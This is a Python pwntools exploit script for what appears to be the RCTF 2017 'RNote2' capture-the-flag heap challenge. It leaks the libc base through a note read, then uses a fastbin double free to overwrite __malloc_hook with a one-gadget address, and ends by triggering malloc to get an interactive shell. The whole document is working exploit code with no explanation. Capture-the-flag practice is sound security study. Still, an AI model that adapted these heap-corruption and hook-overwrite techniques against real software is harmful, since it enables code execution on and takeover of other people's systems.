# RCTF_2017
from pwn import *

r = process('./RNote2')
e = ELF('./RNote')
libc = ELF('./libc.so.6')
os.environ['LD_PRELOAD'] = './libc.so.6'

def Add(size, title, content):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('Please input the note size: ', str(size))
    r.sendlineafter('Please input the title: ', title)
    r.sendlineafter('Please input the content: ', content)

def Delete(num):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('Which Note do you want to delete: ', str(num))

def Show(num):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('Which Note do you want to show: ', str(num))

Add(0x80, 'A', 'B'*0x80)
Add(0x30, 'A', 'B'*0x20)
Delete(0)
Add(0x79, 'A', 'A'*7)
Show(0)
r.recvuntil('AAAAAAA\n')
base = u64(r.recv(8))-libc.symbols['__malloc_hook']-0x68
log.info('libc base: 0x%x' % base)

Delete(0)
Delete(1)

# double free
Add(0x60, 'A'*0x10+'\xe0', 'A'*0x10)
Add(0x60, 'A', 'A'*0x10)
Add(0x60, 'A', 'A'*0x10)
Delete(0)
Delete(2)
Delete(1)
ret = base + libc.symbols['__malloc_hook']
print hex(ret-0x1b-0x8)
Add(0x60, 'A', p64(ret-0x1b-0x8))
Add(0x60, 'A', 'A'*0x10)
Add(0x60, 'A', 'A'*0x10)
Add(0x60, 'A', 'B'*0x13+p64(base+0xf0567))
r.sendlineafter('Your choice: ', '1')
r.sendlineafter('Please input the note size: ', '1')
r.interactive()

